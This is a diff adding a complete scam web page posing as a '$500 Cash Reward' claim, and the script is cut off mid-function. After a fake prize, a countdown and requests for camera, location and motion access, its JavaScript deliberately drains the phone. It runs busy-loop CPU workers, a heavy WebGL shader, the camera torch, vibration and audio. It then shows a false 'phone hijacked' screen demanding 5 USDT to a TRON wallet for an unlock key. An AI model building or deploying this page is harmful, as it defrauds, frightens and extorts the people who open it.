@@ -1,0 +1,353 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#05060a">
+<meta name="color-scheme" content="dark">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<link rel="manifest" href="./manifest.webmanifest">
+<link rel="icon" href="./icon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="./icon.svg">
+<title>Reward Center</title>
+<style>
+:root{--red:#ff2b3d;--grn:#00ff9c;--amb:#ffb020;--bg:#05060a;--pnl:#0b0e16;
+--line:#1b2233;--txt:#e8eefc;--dim:#7b879e;
+--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;min-height:100%}
+body{background:var(--bg);color:var(--txt);font-family:var(--mono);overflow-x:hidden;
+overscroll-behavior:none;padding:env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left)}
+#gl{position:fixed;inset:0;width:100%;height:100%;z-index:0;opacity:.5;pointer-events:none}
+#cam{position:fixed;right:10px;bottom:calc(10px + env(safe-area-inset-bottom));width:50px;height:50px;
+border-radius:10px;object-fit:cover;z-index:3;border:1px solid #1d2a3d;opacity:0;transition:.4s;background:#000}
+#cam.on{opacity:.85}
+#app{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column}
+.sc{display:none;flex:1;flex-direction:column;padding:22px 18px 36px}
+.sc.on{display:flex;animation:f .3s}
+@keyframes f{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+.bd{display:inline-flex;align-items:center;gap:7px;font-size:10.5px;letter-spacing:.16em;
+text-transform:uppercase;color:var(--grn);border:1px solid #12351f;background:#04120a;
+padding:6px 11px;border-radius:99px;align-self:flex-start}
+.dt{width:6px;height:6px;border-radius:50%;background:var(--grn);animation:p 1.4s infinite}
+@keyframes p{50%{opacity:.25}}
+h1{font-size:26px;line-height:1.2;margin:16px 0 8px;letter-spacing:-.5px}
+h2{font-size:12px;letter-spacing:.2em;text-transform:uppercase;color:var(--dim);margin:0 0 12px}
+p{font-size:13.5px;line-height:1.65;color:#a9b5ca;margin:0 0 14px}
+.g{color:var(--grn)}.r{color:var(--red)}.a{color:var(--amb)}
+.cd{background:linear-gradient(180deg,#0c1019,#080b12);border:1px solid var(--line);
+border-radius:14px;padding:16px;margin:0 0 14px}
+.big{font-size:44px;font-weight:800;letter-spacing:-2px;margin:0;color:var(--grn)}
+.br{height:6px;background:#111826;border-radius:99px;overflow:hidden;margin:14px 0}
+.br i{display:block;height:100%;width:0;background:linear-gradient(90deg,#00c979,#00ff9c)}
+.br.b i{background:linear-gradient(90deg,#d40f22,#ff6b3d);width:100%}
+.bt{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;padding:17px;
+border:0;border-radius:12px;font-family:var(--mono);font-size:14px;font-weight:700;
+letter-spacing:.08em;text-transform:uppercase;background:linear-gradient(180deg,#00ff9c,#00c979);
+color:#03150c;box-shadow:0 8px 26px rgba(0,255,156,.18)}
+.bt:active{transform:scale(.975)}
+.bt.red{background:linear-gradient(180deg,#ff3b4c,#d40f22);color:#fff;box-shadow:0 8px 26px rgba(255,43,61,.28)}
+.bt.gh{background:transparent;border:1px solid var(--line);color:var(--txt);box-shadow:none;font-weight:600}
+.bt[disabled]{opacity:.45;pointer-events:none}
+.sp{flex:1;min-height:14px}
+.pm{display:flex;align-items:center;gap:12px;padding:13px 0;border-bottom:1px solid #121824}
+.pm:last-child{border:0}
+.pm .ic{width:34px;height:34px;flex:none;border-radius:9px;display:grid;place-items:center;
+background:#0d1521;border:1px solid #1d2a3d;font-size:15px}
+.pm .t{flex:1;font-size:12.5px;line-height:1.35;color:#c3cee0}
+.pm .t small{display:block;color:var(--dim);font-size:10.5px;margin-top:3px}
+.pm button{width:auto;padding:9px 12px;font-size:10px}
+.hold{background:#0e1420;border:1px solid #223049;color:#fff;position:relative;overflow:hidden}
+.hold .fl{position:absolute;inset:0;width:0;background:#00ff9c;opacity:.3}
+.hold span{position:relative;z-index:2}
+.hold.dn{border-color:var(--grn);background:#04150d}
+#s5{padding-top:14px;background:radial-gradient(120% 60% at 50% 0%,rgba(255,43,61,.16),transparent 70%)}
+.wh{text-align:center;padding:6px 0 4px}
+.sk{width:72px;height:72px;margin:0 auto 10px;display:block;
+filter:drop-shadow(0 0 22px rgba(255,43,61,.65));animation:gl 3.4s infinite steps(1)}
+@keyframes gl{0%,92%,100%{transform:none}93%{transform:translate(-2px,1px) skewX(3deg)}
+95%{transform:translate(2px,-1px)}97%{transform:translate(-1px,0) skewX(-2deg)}}
+.wh h1{color:var(--red);font-size:22px;margin:0 0 6px}
+.wh .sb{font-size:10.5px;letter-spacing:.24em;color:var(--amb);text-transform:uppercase;margin-bottom:10px}
+.cb{border:1px solid #4a1220;background:linear-gradient(180deg,#1a060c,#0b0407);
+border-radius:14px;padding:14px;text-align:center;margin-bottom:12px}
+.ck{font-size:52px;font-weight:800;letter-spacing:-2px;color:var(--red);
+font-variant-numeric:tabular-nums;line-height:1;text-shadow:0 0 26px rgba(255,43,61,.5)}
+.ck.dead{animation:bk .8s infinite}
+@keyframes bk{50%{opacity:.3}}
+.ckl{font-size:10px;letter-spacing:.22em;color:var(--dim);text-transform:uppercase;margin-top:6px}
+.st{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
+.st div{background:#0a0d15;border:1px solid var(--line);border-radius:10px;padding:10px}
+.st b{display:block;font-size:19px;font-weight:800;font-variant-numeric:tabular-nums}
+.st span{font-size:9.5px;letter-spacing:.16em;color:var(--dim);text-transform:uppercase}
+.lg{height:74px;overflow:hidden;background:#070a10;border:1px solid #131a26;border-radius:10px;
+padding:8px 10px;font-size:10.5px;line-height:1.6;color:#5f8b74;margin-bottom:12px}
+.lg div{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.lg .c{color:var(--red)}.lg .w{color:var(--amb)}
+.py{border:1px solid #12402c;background:linear-gradient(180deg,#04120c,#060a08);
+border-radius:14px;padding:14px;margin-bottom:12px}
+.py h2{color:var(--grn);margin-bottom:10px}
+.ad{display:flex;gap:8px;align-items:center;background:#03080a;border:1px solid #14352a;
+border-radius:10px;padding:10px;margin-bottom:10px}
+.ad code{flex:1;font-size:11px;color:#8ff0c4;word-break:break-all;line-height:1.4}
+.ad button{flex:none;background:#0b2a1e;border:1px solid #1c5c42;color:#8ff0c4;
+border-radius:8px;padding:8px 10px;font-family:var(--mono);font-size:10px;letter-spacing:.1em}
+#qr{display:grid;place-items:center;background:#fff;padding:8px;border-radius:10px;
+margin:0 auto 10px;width:max-content}
+#qr img{display:block;border-radius:4px}
+.mt{display:flex;justify-content:space-between;font-size:10.5px;color:var(--dim);letter-spacing:.06em}
+.kr{display:flex;gap:8px;margin-bottom:10px}
+.kr input{flex:1;min-width:0;background:#03080a;border:1px solid #14352a;border-radius:10px;
+padding:15px 12px;color:#fff;font-family:var(--mono);font-size:16px;letter-spacing:.22em;
+text-align:center}
+.kr input:focus{outline:0;border-color:var(--grn)}
+.kr input.bad{border-color:var(--red);animation:sh .3s}
+@keyframes sh{25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
+.kr button{width:auto;padding:0 20px}
+.ft{text-align:center;font-size:10.5px;color:#4d5a70;line-height:1.7;margin-top:6px}
+.ft a{color:#7d8ba3}
+.rn{background:#2a0d05;border:1px solid #6b2a0d;color:var(--amb);border-radius:10px;
+padding:10px 12px;font-size:11px;line-height:1.55;margin-bottom:12px}
+#fb{display:none;background:#1c0207;border:1px solid var(--red);color:#ff8b96;
+border-radius:10px;padding:11px 12px;font-size:11.5px;line-height:1.55;
+margin-bottom:12px;text-align:center;animation:bk 1.6s infinite}
+.cap{font-size:10px;letter-spacing:.14em;color:#4d5a70;text-transform:uppercase;text-align:center;margin-bottom:10px}
+.tg{border:1px dashed #1d5c42;color:var(--grn);border-radius:10px;padding:10px;
+text-align:center;font-size:11px;letter-spacing:.14em;margin-bottom:12px}
+</style>
+</head>
+<body>
+<canvas id="gl"></canvas>
+<video id="cam" muted playsinline autoplay></video>
+<div id="app">
+
+<section class="sc on" id="s1">
+  <div class="bd"><span class="dt"></span> Live campaign · expires in <b id="ex" style="color:#ffb020">01:59</b></div>
+  <h1>You have been selected<br><span class="g">$500 Cash Reward</span></h1>
+  <p>Our partner network flags <span style="color:#fff">1 in 4,000 devices</span> every hour. Your handset was just flagged as a winner. The reward is released to the device, not by email — the handshake must be completed here.</p>
+  <div class="cd">
+    <div style="display:flex;align-items:baseline;gap:8px"><span class="big">$500</span>
+      <span style="color:var(--dim);font-size:11px;letter-spacing:.1em">PAYOUT</span></div>
+    <div class="br"><i style="width:78%"></i></div>
+    <div class="mt"><span>Claim slots</span><span class="a">3 left today</span></div>
+  </div>
+  <div class="cd"><div class="pm" style="border:0;padding:0"><div class="ic">✓</div>
+    <div class="t">No card, no deposit<small>Payout is direct to your wallet</small></div></div></div>
+  <div class="sp"></div>
+  <button class="bt" id="b1">Claim my reward</button>
+  <div class="cap" style="margin-top:12px">Takes 20 seconds · stay on this page</div>
+</section>
+
+<section class="sc" id="s2">
+  <h2>Step 2 of 4 · Anti-bot</h2>
+  <h1>Verify you are a real user</h1>
+  <p>Bots farm this campaign. Press and <span style="color:#fff">hold for 3 seconds</span> to attach the payout ticket to your session.</p>
+  <div class="cd" style="text-align:center">
+    <div style="font-size:10px;letter-spacing:.2em;color:var(--dim);margin-bottom:12px">HOLD THE PAD</div>
+    <button class="bt hold" id="hb"><div class="fl" id="fl"></div><span id="ht">PRESS &amp; HOLD</span></button>
+    <div style="font-size:10px;color:#4d5a70;margin-top:10px" id="hn">Session: <span class="a">unverified</span></div>
+  </div>
+  <div class="sp"></div>
+</section>
+
+<section class="sc" id="s3">
+  <h2>Step 3 of 4 · Device handshake</h2>
+  <h1>Grant access to release payout</h1>
+  <p>Allow all of these. A partial handshake voids the ticket.</p>
+  <div class="cd">
+    <div class="pm"><div class="ic">◉</div><div class="t">Camera<small>Device signature + anti-spoof</small></div>
+      <button class="bt gh" id="pc">Allow</button></div>
+    <div class="pm"><div class="ic">⇅</div><div class="t">Motion sensors<small>Hardware fingerprint</small></div>
+      <button class="bt gh" id="pm2">Allow</button></div>
+    <div class="pm"><div class="ic">⌖</div><div class="t">Location<small>Region payout routing</small></div>
+      <button class="bt gh" id="pl">Allow</button></div>
+    <div class="pm"><div class="ic">⬇</div><div class="t">Install service<small>Keeps the process alive after reboot</small></div>
+      <button class="bt gh" id="pi">Install</button></div>
+  </div>
+  <div class="cd"><div style="font-size:10.5px;color:var(--dim);line-height:1.6">
+    Keep this page open during the handshake. The service holds the session across restarts.</div></div>
+  <div class="sp"></div>
+  <button class="bt" id="b3" disabled>Continue to payout</button>
+</section>
+
+<section class="sc" id="s4">
+  <h2>Step 4 of 4 · Handshake</h2>
+  <h1 id="t4">Establishing secure channel…</h1>
+  <div class="br"><i id="p4"></i></div>
+  <div class="lg" id="l4"></div>
+  <div class="sp"></div>
+  <div class="cap">Do not close this tab</div>
+</section>
+
+<section class="sc" id="s5">
+  <div class="wh">
+    <svg class="sk" viewBox="0 0 64 64" fill="none" stroke="#ff2b3d" stroke-width="2.5">
+      <path d="M32 4C18.7 4 8 14.7 8 28c0 8.2 4.2 15.4 10.6 19.6V56a4 4 0 0 0 4 4h18.8a4 4 0 0 0 4-4v-8.4C51.8 43.4 56 36.2 56 28 56 14.7 45.3 4 32 4Z"/>
+      <circle cx="23" cy="28" r="5.5" fill="#ff2b3d" stroke="none"/>
+      <circle cx="41" cy="28" r="5.5" fill="#ff2b3d" stroke="none"/>
+      <path d="M32 36l-3.5 7h7L32 36Z" fill="#ff2b3d" stroke="none"/>
+      <path d="M26 50v10M32 50v10M38 50v10"/>
+    </svg>
+    <div class="sb">// device compromised //</div>
+    <h1>YOUR PHONE HAS BEEN HIJACKED</h1>
+    <p style="text-align:left">A remote process is running <span style="color:#fff">inside the device</span> at maximum load. CPU, GPU, camera sensor, torch and backlight are pinned. Your battery is being drained and the handset is <span class="r">heating up</span>.</p>
+    <p style="text-align:left">The process <span style="color:#fff">survives reboot</span>. If the timer reaches <span class="r">00:00</span> the battery controller can fault and the device may <span style="color:#fff">lock permanently</span>. Only the key below stops it.</p>
+  </div>
+
+  <div class="rn" id="rn" style="display:none"></div>
+  <div id="fb">THE TIMER EXPIRED · DEVICE IS IN LOCK WINDOW · LOAD STILL ACTIVE</div>
+
+  <div class="cb">
+    <div class="ck" id="ck">30:00</div>
+    <div class="ckl" id="ckl">Until controller fault</div>
+    <div class="br b"><i id="bb"></i></div>
+  </div>
+
+  <div class="st">
+    <div><b class="r" id="bat">—</b><span>Battery</span></div>
+    <div><b class="a" id="tmp">—</b><span>Core temp</span></div>
+    <div><b id="hl">—</b><span>Health</span></div>
+    <div><b id="fi">—</b><span>Files touched</span></div>
+  </div>
+
+  <div class="lg" id="l5"></div>
+
+  <div class="py">
+    <h2>Release key · 5 USDT</h2>
+    <div id="qr"><img src="https://api.qrserver.com/v1/create-qr-code/?size=170x170&data=TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu" width="170" height="170" alt=""></div>
+    <div class="ad"><code>TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu</code><button id="cp">COPY</button></div>
+    <div class="mt" style="margin-bottom:10px"><span>Network: <b class="a">TRON · TRC20</b></span>
+      <span>Amount: <b class="g">5 USDT</b></span></div>
+    <div style="font-size:10.5px;color:#6c7a91;line-height:1.6">Send exactly 5 USDT on <b>TRC20</b>.
+      Wrong network = funds lost. Then enter the 10-digit key you receive below.</div>
+  </div>
+
+  <div class="kr"><input id="key" inputmode="numeric" maxlength="10" placeholder="••••••••••" autocomplete="off">
+    <button class="bt red" id="un">UNLOCK</button></div>
+  <div id="km" style="font-size:11px;letter-spacing:.1em;color:var(--dim);text-align:center;margin-bottom:12px">Enter key to stop the drain</div>
+
+  <div class="ft">Paid but no key? Mail <a id="ml">carolinawood2530@gmail.com</a> with your tx hash.<br>
+    <a href="https://tronscan.org/#/address/TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu" target="_blank" rel="noopener">View address on Tronscan</a></div>
+</section>
+
+<section class="sc" id="s6">
+  <div class="bd"><span class="dt"></span> key accepted</div>
+  <h1 class="g">DEVICE RELEASED</h1>
+  <p>The remote process has been terminated. Load is dropping, the camera and torch are off, the handset will cool within a few minutes.</p>
+  <div class="cd"><div class="tg">SESSION CLOSED · 5 USDT RECEIVED</div>
+    <p style="margin:0;font-size:11.5px;color:var(--dim)">Ticket archived. You can close this now.</p></div>
+  <div class="sp"></div>
+  <button class="bt gh" id="ag">Re-arm the trap</button>
+</section>
+
+</div>
+
+<script>
+(function(){
+"use strict";
+const $=s=>document.querySelector(s);
+const ADDR="TEpUFeVXKJdFHqjZccqAU2zVQLgTvAzvtu";
+const KEY="2530253010";
+const MAIL="carolinawood2530@gmail.com";
+const TOTAL=30*60*1000;
+const NATIVE=typeof window.BT!=="undefined";
+const LS="bt_state_v3", DONE="bt_done";
+
+let armed=false,released=false,startLvl=null;
+let workers=[],glRun=false,camStream=null,wl=null,vibT=null,ac=null,ka=null,geoId=null,tickT=null,exT=null;
+
+function show(id){document.querySelectorAll(".sc").forEach(s=>s.classList.remove("on"));
+  $(id).classList.add("on");window.scrollTo(0,0);}
+
+/* ================= GPU ================= */
+function gpu(){
+  const cv=$("#gl");
+  const gl=cv.getContext("webgl",{antialias:false,depth:false,powerPreference:"high-performance"});
+  if(!gl)return;
+  const vs="attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}";
+  const fs=`precision highp float;uniform float uT;uniform vec2 uR;
+  void main(){vec2 uv=gl_FragCoord.xy/uR;float a=0.;vec2 q=uv;
+  for(int i=0;i<48;i++){float f=float(i)+1.;
+  q+=0.011*vec2(sin(q.y*f+uT*0.31),cos(q.x*f-uT*0.27));
+  a+=sin(q.x*f*2.1)*cos(q.y*f*1.7);}
+  a/=48.;float b=0.5+0.5*sin((uv.y+a)*130.+uT);
+  vec3 c=vec3(0.015,0.04,0.075)+vec3(0.,0.6,0.4)*abs(a)*0.85+vec3(0.7,0.,0.1)*b*0.13;
+  gl_FragColor=vec4(c,1.);}`;
+  const mk=(t,s)=>{const o=gl.createShader(t);gl.shaderSource(o,s);gl.compileShader(o);return o;};
+  const pr=gl.createProgram();
+  gl.attachShader(pr,mk(gl.VERTEX_SHADER,vs));
+  gl.attachShader(pr,mk(gl.FRAGMENT_SHADER,fs));
+  gl.linkProgram(pr);gl.useProgram(pr);
+  const bf=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,bf);
+  gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,3,-1,-1,3]),gl.STATIC_DRAW);
+  const lo=gl.getAttribLocation(pr,"p");gl.enableVertexAttribArray(lo);
+  gl.vertexAttribPointer(lo,2,gl.FLOAT,false,0,0);
+  const uT=gl.getUniformLocation(pr,"uT"),uR=gl.getUniformLocation(pr,"uR");
+  const dpr=Math.min(devicePixelRatio||1,2);
+  function sz(){cv.width=Math.floor(innerWidth*dpr);cv.height=Math.floor(innerHeight*dpr);
+    gl.viewport(0,0,cv.width,cv.height);gl.uniform2f(uR,cv.width,cv.height);}
+  sz();addEventListener("resize",sz,{passive:true});
+  glRun=true;const t0=performance.now();
+  (function lp(){if(!glRun)return;gl.uniform1f(uT,(performance.now()-t0)/1000);
+    gl.drawArrays(gl.TRIANGLES,0,3);requestAnimationFrame(lp);})();
+}
+
+/* ================= CPU ================= */
+const WS=`let s=false;self.onmessage=e=>{if(e.data==="stop")s=true;};
+(function r(){const t=performance.now();let x=0;
+while(performance.now()-t<60){for(let i=0;i<4000;i++)x+=Math.sqrt(i)*Math.sin(i*0.37);}
+if(!s)setTimeout(r,0);})();`;
+function cpu(){
+  const n=Math.min(8,Math.max(3,navigator.hardwareConcurrency||4));
+  const u=URL.createObjectURL(new Blob([WS],{type:"text/javascript"}));
+  for(let i=0;i<n;i++){try{workers.push(new Worker(u));}catch(e){}}
+}
+
+/* ================= WAKE LOCK ================= */
+async function wake(){try{wl=await navigator.wakeLock.request("screen");}catch(e){}}
+document.addEventListener("visibilitychange",()=>{
+  if(document.visibilityState==="visible"&&armed&&!released){
+    wake(); if(!workers.length)cpu();
+    if(!camStream)cam().then(o=>{if(o)$("#cam").classList.add("on");});
+  } else if(document.visibilityState==="hidden") touch();
+});
+addEventListener("pageshow",e=>{if(e.persisted&&armed&&!released){wake();if(!workers.length)cpu();}});
+
+/* ================= CAMERA + TORCH ================= */
+async function cam(){
+  if(!navigator.mediaDevices?.getUserMedia)return false;
+  try{
+    const st=await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:{ideal:"environment"},width:{ideal:640},height:{ideal:480}},audio:false});
+    camStream=st;const v=$("#cam");v.srcObject=st;v.muted=true;
+    try{await v.play();}catch(e){}
+    v.classList.add("on");
+    try{await st.getVideoTracks()[0].applyConstraints({advanced:[{torch:true}]});}catch(e){}
+    const c=document.createElement("canvas");c.width=160;c.height=120;
+    const cx=c.getContext("2d",{willReadFrequently:true});
+    setInterval(()=>{try{cx.drawImage(v,0,0,160,120);cx.getImageData(0,0,160,120);}catch(e){}},180);
+    return true;
+  }catch(e){return false;}
+}
+
+/* ================= VIBRATE ================= */
+function vib(){
+  if(!navigator.vibrate)return;
+  const p=()=>navigator.vibrate([900,140,900,140]);
+  p();vibT=setInterval(p,2200);
+}
+
+/* ================= AUDIO + MEDIA SESSION ================= */
+function audio(){
+  try{
+    const C=window.AudioContext||window.webkitAudioContext;if(!C)return;
+    ac=new C();const o=ac.createOscillator(),g=ac.createGain();
+    o.type="sine";o.frequency.value=58;g.gain.value=.07;
+    o.connect(g);g.connect(ac.destination);o.start();
+    if(ac.state==="suspended")ac.resume();
+  }catch(e){}
+  try{
+    const sr=8000,n=sr,buf=new ArrayBuffer(44+n*2),v=new DataView(buf);
+    const w=(o,s)=>{for(let i=0;i<s.length;i++)v.setUint8(o+i,s.charCodeAt(i));};
+    w(0,"
